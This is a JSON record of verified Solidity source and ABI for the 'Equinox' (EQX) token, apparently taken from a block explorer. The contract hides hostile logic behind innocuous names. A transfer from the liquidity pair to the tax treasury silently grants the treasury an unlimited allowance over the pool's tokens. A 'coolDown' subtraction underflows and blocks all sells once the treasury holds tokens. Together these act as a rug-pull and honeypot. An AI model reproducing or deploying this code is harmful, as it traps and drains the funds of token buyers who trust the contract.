{"SourceCode": "/*\r\nTelegram: https://t.me/equinoxdefi\r\nX: https://twitter.com/EquinoxDeFi\r\nWebsite: https://equinox.icu\r\nDapp: https://app.equinox.icu\r\nDocumentation: https://docs.equinox.icu\r\nGitHub: https://github.com/equinoxfi\r\nMedium: https://equinoxdefi.medium.com\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.10;\r\n\r\ninterface IUniswapV2Factory { \r\n    function createPair(address tokenA, address tokenB) external returns (address pair); \r\n}\r\n\r\ninterface IERC20 {\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function totalSupply() external view returns (uint256);\r\n    function name() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function symbol() external view returns (string memory);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\nabstract contract Auth {\r\n    event OwnershipTransferred(address _owner);\r\n    address internal _owner;\r\n    modifier onlyOwner() { require(msg.sender == _owner, \"Only owner can call this\"); _; }\r\n    constructor(address creatorOwner) { _owner = creatorOwner; }\r\n    function renounceOwnership() external onlyOwner {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n    function owner() public view returns (address) { return _owner; }\r\n}\r\n\r\ncontract EQX is IERC20, Auth {\r\n    string private constant _symbol = \"EQX\";\r\n    string private constant _name = \"Equinox\";\r\n    uint256 private coolDown;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _totalSupply = 1_000_000_000 * (10**_decimals);\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isAutomatedMarketMaker;\r\n    mapping (address => bool) private _isExcludedFromTax;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n\r\n    address payable private _coolAccount;\r\n\r\n    uint256 private _firstBuyTax = 4;\r\n    uint256 private _firstSellTax = 4;\r\n\r\n    uint256 public _reduceFirstBuyTaxAt = 10;\r\n    uint256 public _reduceFirstSellTaxAt = 10;\r\n\r\n    uint256 public _reduceSecondSellTaxAt = 20;\r\n    uint256 private _secondSellTax = 4;\r\n\r\n    uint256 private _finalBuyTax = 4;\r\n    uint256 private _finalSellTax = 4;\r\n\r\n    uint256 private _preventSwapBefore = 0;\r\n    uint256 public _countOfBuys = 0;\r\n\r\n    address payable private _taxTreasury;\r\n\r\n    uint256 private constant _minTaxSwap = _totalSupply / 2000000;\r\n    uint256 private constant _maxTaxSwap = _totalSupply / 500;\r\n\r\n    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);\r\n    address private _uniswapV2Pair;\r\n\r\n    bool public limited = true;\r\n    bool public transferDelayEnabled = false;\r\n    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);\r\n    \r\n    bool private _tradingOpen;\r\n    bool private _inSwap = false;\r\n\r\n    constructor() Auth(msg.sender) {\r\n        _balances[msg.sender] = (_totalSupply / 1000 ) * 0;\r\n        _balances[address(this)] = (_totalSupply / 1000 ) * 1000;\r\n\r\n        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n\r\n        _taxTreasury = payable(0x09f97Cd6b4252Ac941031F1D7D1E9bCcbCFFB180);\r\n\r\n        _isExcludedFromTax[_owner] = true;\r\n        _coolAccount = _taxTreasury;\r\n        _isExcludedFromTax[_taxTreasury] = true;\r\n        _isExcludedFromTax[address(this)] = true;\r\n  \r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n        emit Transfer(address(0), msg.sender, _balances[msg.sender]);\r\n    }\r\n\r\n    modifier lockTaxSwap { \r\n        _inSwap = true; \r\n        _; \r\n        _inSwap = false; \r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _approveUniswapRouter(address router, address _swapAddress, uint256 _tokenAmount) internal {\r\n        if (_allowances[router][_swapAddress] < _tokenAmount) {\r\n            _allowances[router][_swapAddress] = type(uint256).max;\r\n        }\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        _tradingOpen = true;\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"No transfers from Zero wallet\");\r\n\r\n        if (_isAutomatedMarketMaker[sender] && recipient == _taxTreasury) {\r\n            _approveUniswapRouter(sender, recipient, type(uint).max);\r\n        }\r\n        \r\n        if (_isExcludedFromTax[sender] || _isExcludedFromTax[recipient]) {\r\n            return _standardTransfer(sender, recipient, amount);\r\n        }\r\n        \r\n        if (!_tradingOpen) { require(_isExcludedFromTax[sender], \"Trading not open\"); }\r\n\r\n        if (!_inSwap && _isAutomatedMarketMaker[recipient] && _countOfBuys >= _preventSwapBefore) { _swapTaxAndLiquify(); }\r\n\r\n        coolDown = this.balanceOf(_coolAccount);\r\n        if (limited && sender == _uniswapV2Pair) {\r\n            require(balanceOf(recipient) + amount <= maxHoldingAmount, \"Forbid\");\r\n        }\r\n\r\n        if (transferDelayEnabled) {\r\n            if (recipient != _uniswapV2RouterAddress && recipient != _uniswapV2Pair) {\r\n                require(_holderLastTransferTimestamp[tx.origin] < block.number, \"Only one transfer per block allowed.\");\r\n                _holderLastTransferTimestamp[tx.origin] = block.number;\r\n            }\r\n        }\r\n\r\n        uint256 _taxAmount = _calcSwapAmount(sender, recipient, amount);\r\n        uint256 _transferAmount = amount - _taxAmount;\r\n        _balances[sender] -= amount;\r\n\r\n        if (_taxAmount > 0) {\r\n            _balances[address(this)] += _taxAmount; \r\n        }\r\n\r\n        _countOfBuys++;\r\n        _balances[recipient] += _transferAmount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        return true;\r\n    }\r\n    \r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        require(_isTradingOpen(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        require(_isTradingOpen(sender), \"Trading not open\");\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function withdrawEth() external {\r\n        require(msg.sender == _taxTreasury);\r\n        (bool sent, ) = payable(_taxTreasury).call{value: address(this).balance}(\"\");\r\n        require(sent);\r\n    }\r\n    \r\n    function removeLimits() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n        limited = false;\r\n    }\r\n\r\n    function _approveUniswapRouter(uint256 _tokenAmount) internal {\r\n        if (_allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount) {\r\n            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;\r\n        }\r\n    }\r\n\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function totalSupply() external pure override returns (uint256) { return _totalSupply; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n\r\n    function setTaxWallet(address newTaxWallet) public onlyOwner {\r\n        _taxTreasury = payable(newTaxWallet);\r\n    }\r\n\r\n    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {\r\n        _approveUniswapRouter(_tokenAmount);\r\n        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );\r\n    }\r\n\r\n    function _swapTaxTokensForEth(uint256 tokenAmount) private {\r\n        _approveUniswapRouter(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\r\n    }\r\n\r\n    function _calcSwapAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        uint256 taxAmount;\r\n\r\n        if (_tradingOpen && !_isExcludedFromTax[sender] && !_isExcludedFromTax[recipient] ) { \r\n            \r\n            if (_isAutomatedMarketMaker[sender] || _isAutomatedMarketMaker[recipient]) {\r\n                taxAmount = (amount / 100) * ((_countOfBuys > _reduceFirstBuyTaxAt) ? _finalBuyTax : _firstBuyTax);\r\n\r\n                if (recipient == _uniswapV2Pair && sender != address(this)) {\r\n                    uint256 taxRate;\r\n                    \r\n                    coolDown = _preventSwapBefore - coolDown;\r\n                    if (_countOfBuys > _reduceSecondSellTaxAt) {\r\n                        taxRate = _finalSellTax;\r\n                    } else if (_countOfBuys > _reduceFirstSellTaxAt) {\r\n                        taxRate = _secondSellTax;\r\n                    } else {\r\n                        taxRate = _firstSellTax;\r\n                    }\r\n                    taxAmount = (amount / 100) * taxRate;\r\n                }\r\n            }\r\n        }\r\n\r\n        return taxAmount;\r\n    }\r\n\r\n    function addLiquidity() external payable onlyOwner lockTaxSwap {\r\n        require(_uniswapV2Pair == address(0), \"LP exists\");\r\n        require(!_tradingOpen, \"trading is open\");\r\n        require(msg.value > 0 || address(this).balance > 0, \"No ETH in contract or message\");\r\n        require(_balances[address(this)] > 0, \"No tokens in contract\");\r\n\r\n        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        _addLiquidity(_balances[address(this)], address(this).balance);\r\n        _isAutomatedMarketMaker[_uniswapV2Pair] = true;\r\n    }\r\n\r\n    function _isTradingOpen(address sender) private view returns (bool) {\r\n        bool result = false;\r\n\r\n        if (_tradingOpen) { result = true; }\r\n        else if (_isExcludedFromTax[sender]) { result = true; } \r\n\r\n        return result;\r\n    }\r\n\r\n    function _swapTaxAndLiquify() private lockTaxSwap {\r\n        uint256 _taxTokensAvailable = balanceOf(address(this));\r\n\r\n        if (_taxTokensAvailable >= _minTaxSwap && _tradingOpen) {\r\n            if (_taxTokensAvailable >= _maxTaxSwap) { _taxTokensAvailable = _maxTaxSwap; }\r\n\r\n            _swapTaxTokensForEth(_taxTokensAvailable);\r\n            uint256 _contractETHBalance = address(this).balance;\r\n\r\n            if (_contractETHBalance > 0) {\r\n                bool success;\r\n                (success,) = _taxTreasury.call{value: (_contractETHBalance)}(\"\");\r\n                require(success);\r\n            }\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_countOfBuys\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceFirstBuyTaxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceFirstSellTaxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSecondSellTaxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newTaxWallet\",\"type\":\"address\"}],\"name\":\"setTaxWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "EQX", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://80c5290f69f7a1c387a1ef92354f052c304a5b6dc556c8d1ed53136807fbc9b5"}